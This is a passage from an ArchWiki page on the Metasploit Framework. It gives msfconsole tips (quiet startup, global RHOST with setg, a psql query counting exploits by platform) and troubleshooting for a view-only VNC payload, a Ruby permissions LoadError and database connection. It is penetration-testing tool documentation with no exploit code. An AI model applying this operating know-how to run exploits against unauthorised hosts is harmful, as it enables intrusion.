<h3><span class="mw-headline" id="Popularity_of_a_platform_by_number_of_exploits">Popularity of a platform by number of exploits</span></h3>
<p>To view the possible <code>platform</code> values, and number of available exploits, run from <code>psql</code>:
</p>
<pre>SELECT name, count(*)
FROM module_platforms
GROUP BY name
ORDER BY count DESC;
</pre>
<h3><span class="mw-headline" id="Disable_the_ASCII_banner_on_startup">Disable the ASCII banner on startup</span></h3>
<p>To disable the banner, run <code>msfconsole</code> with <code>-q</code>/<code>--quiet</code> argument:
</p>
<pre>$ msfconsole --quiet
</pre>
<h3><span class="mw-headline" id="Preserve_variable_values_between_sessions">Preserve variable values between sessions</span></h3>
<p>If you do not want the variables to reset when selecting another module and when rerunning <code>msfconsole</code> then set it globally via <code>setg</code>, for example:
</p>
<pre>msf &gt; setg RHOST 192.168.56.102
</pre>
<h2><span class="mw-headline" id="Troubleshooting">Troubleshooting</span></h2>
<h3><span class="mw-headline" id="Cannot_click_in_VNC_viewer">Cannot click in VNC viewer</span></h3>
<p>If you selected VNC viewer as a payload, but are unable to click or do any actions, that means you forgot to set the <code>ViewOnly</code> variable to false.  To fix this problem, re-run the exploit with the variable set to <code>false</code>:
</p>
<pre>msf &gt; set ViewOnly false
</pre>
<h3>
<span id="cannot_load_such_file_--_robots_.28LoadError.29"></span><span class="mw-headline" id="cannot_load_such_file_--_robots_(LoadError)">cannot load such file -- robots (LoadError)</span>
</h3>
<p>If you get an error like this:
</p>
<pre>~/metasploit-framework/lib/metasploit/framework.rb:19:in `require': cannot load such file -- robots (LoadError)
    from ~/metasploit-framework/lib/metasploit/framework.rb:19:in `&lt;top (required)&gt;'
    from ~/metasploit-framework/lib/metasploit/framework/database.rb:1:in `require'
    from ~/metasploit-framework/lib/metasploit/framework/database.rb:1:in `&lt;top (required)&gt;'
    from ~/metasploit-framework/lib/metasploit/framework/parsed_options/base.rb:17:in `require'
    from ~/metasploit-framework/lib/metasploit/framework/parsed_options/base.rb:17:in `&lt;top (required)&gt;'
    from ~/metasploit-framework/lib/metasploit/framework/parsed_options/console.rb:2:in `&lt;top (required)&gt;'
    from /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/activesupport-3.2.19/lib/active_support/inflector/methods.rb:230:in `const_get'
    from /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/activesupport-3.2.19/lib/active_support/inflector/methods.rb:230:in `block in constantize'
    from /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/activesupport-3.2.19/lib/active_support/inflector/methods.rb:229:in `each'
    from /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/activesupport-3.2.19/lib/active_support/inflector/methods.rb:229:in `constantize'
    from /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/activesupport-3.2.19/lib/active_support/core_ext/string/inflections.rb:54:in `constantize'
    from ~/metasploit-framework/lib/metasploit/framework/command/base.rb:73:in `parsed_options_class'
    from ~/metasploit-framework/lib/metasploit/framework/command/base.rb:69:in `parsed_options'
    from ~/metasploit-framework/lib/metasploit/framework/command/base.rb:47:in `require_environment!'
    from ~/metasploit-framework/lib/metasploit/framework/command/base.rb:81:in `start'
    from ./msfconsole:48:in `&lt;main&gt;'
</pre>
<p>This happens because the file <code>robots.rb</code> has incorrect permissions and can be read only by the root user (see <a rel="nofollow" class="external text" href="https://github.com/fizx/robots/issues/6">the bug report</a>):
</p>
<pre style="margin-bottom: 0; border-bottom:none; padding-bottom:0.8em;">$ ls -l /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/robots-0.10.1/lib</pre>
<pre style="margin-top: 0; border-top-style:dashed; padding-top: 0.8em;">total 4
-rw-r----- 1 root root 3174 Oct 19 16:47 robots.rb
</pre>
<p>To fix this, simply change the permission to be world-readable:
</p>
<pre># chmod o+r /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/robots-0.10.1/lib/robots.rb
</pre>
<h3><span class="mw-headline" id="db_connect_fails_silently">db_connect fails silently</span></h3>
<p>If upon running <code>db_connect</code> you see no output, but later getting a message like this:
</p>
<pre>[!] Database not connected or cache not built, using slow search
</pre>
<p>that probably means that the <code>postgresql</code> service is not running.
</p>
<h2><span class="mw-headline" id="See_also">See also</span></h2>
<ul>
<li><a rel="nofollow" class="external text" href="https://www.offensive-security.com/metasploit-unleashed/Main_Page">Metasploit Unleashed security training</a></li>
<li><a rel="nofollow" class="external text" href="https://github.com/rapid7/metasploit-framework/wiki">GitHub wiki</a></li>
<li><a href="https://en.wikibooks.org/wiki/Metasploit" class="extiw" title="wikibooks:Metasploit">Wikibooks</a></li>
<li><a href="https://en.wikipedia.org/wiki/Metasploit_Project" class="extiw" title="wikipedia:Metasploit Project">Wikipedia</a></li>
</ul>
</div>
</div>
					<div id="catlinks" class="catlinks" data-mw="interface">
<div id="mw-normal-catlinks" class="mw-normal-catlinks">
<a href="../Special:Categories.html" title="Special:Categories">Categories</a>: <ul>
<li><a href="../en/Category:Networking.html" title="Category:Networking">Networking</a></li>
<li><a href="../en/Category:Security.html" title="Category:Security">Security</a></li>
</ul>
</div>
<div id="mw-hidden-catlinks" class="mw-hidden-catlinks mw-hidden-cats-hidden">Hidden categories: <ul>
<li><a href="../en/Category:Pages_or_sections_flagged_with_Template:Expansion.html" title="Category:Pages or sections flagged with Template:Expansion">Pages or sections flagged with Template:Expansion</a></li>
<li><a href="../en/Category:Pages_with_dead_links.html" title="Category:Pages with dead links">Pages with dead links</a></li>
</ul>
</div>
</div>
				</div>
			</main>
			
		</div>
		<div class="mw-footer-container">
			
<footer id="footer" class="mw-footer" role="contentinfo" style="margin: 0">
	<ul id="footer-info">
	<li data-nosnippet="">Retrieved from "<a dir="ltr" href="https://wiki.archlinux.org/index.php?title=Metasploit_Framework&amp;oldid=784685">https://wiki.archlinux.org/index.php?title=Metasploit_Framework&amp;oldid=784685</a>"</li>
<li id="footer-info-lastmod"> This page was last edited on 7 August 2023, at 13:24.</li>
	<li id="footer-info-copyright">Content is available under <a class="external" rel="nofollow" href="https://www.gnu.org/copyleft/fdl.html">GNU Free Documentation License 1.3 or later</a> unless otherwise noted.</li>
<br>
</ul>

	<ul id="footer-places">
	<li id="footer-places-privacy"><a href="https://terms.archlinux.org/docs/privacy-policy/">Privacy policy</a></li>
	<li id="footer-places-about"><a href="../en/ArchWiki:About.html">About ArchWiki</a></li>
	<li id="footer-places-disclaimers"><a href="../en/ArchWiki:General_disclaimer.html">Disclaimers</a></li>
</ul>

	<ul id="footer-icons" class="noprint">
	<li id="footer-copyrightico"><a href="https://www.gnu.org/copyleft/fdl.html"><img src="/resources/assets/licenses/gnu-fdl.png" alt="GNU Free Documentation License 1.3 or later" width="88" height="31" loading="lazy"></a></li>
	<li id="footer-poweredbyico"><img src="/resources/assets/poweredby_mediawiki_88x31.png" srcset="/resources/assets/poweredby_mediawiki_132x47.png 1.5x, /resources/assets/poweredby_mediawiki_176x62.png 2x" width="88" height="31" loading="lazy"></li>
</ul>

</footer>

		</div>
	</div> 
</div> 
<div class="vector-settings" id="p-dock-bottom">
	<ul>
		<li>
		
		<button class="cdx-button cdx-button--icon-only vector-limited-width-toggle" id=""><span class="vector-icon mw-ui-icon-fullScreen mw-ui-icon-wikimedia-fullScreen"></span>

<span>Toggle limited content width</span>
</button>
</li>
	</ul>
</div>
</body>
</html>
